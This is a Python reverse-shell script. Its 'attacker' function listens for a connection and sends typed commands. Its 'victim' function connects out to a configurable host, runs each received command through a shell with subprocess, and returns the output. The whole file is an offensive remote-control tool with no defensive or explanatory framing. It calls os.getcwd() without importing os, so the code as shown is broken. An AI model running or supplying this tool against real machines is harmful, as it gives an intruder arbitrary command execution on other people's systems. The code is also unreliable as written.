import socket
import getopt
import sys
HOST = "localhost"
PORT = 1234
LISTEN = False
from threading import Thread
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def attacker():
    s.bind ((HOST, PORT))

    s.listen(5)

    print("Listening on {} {}".format(HOST, PORT))

    client_socket, addr = s.accept()
    print("Client Connected")
    client_socket.send("hai". encode())
    while True:
        command = input("Shell>")
        client_socket.send(command.encode())
        message = client_socket.recv(1024)
        print(message.decode())

    
def victim():
    s.connect((HOST, PORT))
    print("connected to server")
    print(s.recv(1024).decode())
    while True:
        command = s.recv(1024).decode()
        result = subprocess.Popen(command, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE,shell=True)
        out_bytes = result.stdout.read() + result.stderr.read() 
        out_str = out_bytes.decode()
        s.send(str.encode(out_str + os.getcwd() + '>'))
        

def connect():
    if LISTEN == True:
        attacker()
    else:
        victim()

def main() :
    global HOST, PORT, LISTEN
    opts, args = getopt.getopt(sys.argv[1:], "h:p:l", ["host=", "port="])

    for key, value in opts:
        if key in("-h", "--host"):
            HOST = value
        elif key in("-p", "--port"):
            PORT = int(value)
        elif key in("-l"):
            LISTEN = True

    connect()

if __name__ == "__main__":
    main()